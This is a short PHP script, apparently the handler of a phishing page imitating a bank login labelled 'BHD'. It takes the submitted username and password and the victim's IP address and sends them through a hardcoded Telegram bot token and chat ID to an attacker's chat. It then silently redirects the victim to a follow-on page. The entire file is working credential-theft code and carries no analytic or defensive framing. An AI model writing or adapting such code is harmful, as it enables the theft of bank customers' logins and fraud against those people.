<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["user"] ?? '';
    $pass = $_POST["pass"] ?? '';

    // OBTENER IP PÚBLICA REAL
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }

    $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
    $chatID = "8555745789";

    $message = "=====DATOS BHD=======\n";
    $message .= "User: $user\n";
    $message .= "Clave: $pass\n";
    $message .= "IP del cliente: $ip";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);

    header("Location: pa01.php");
    exit;
}
?>
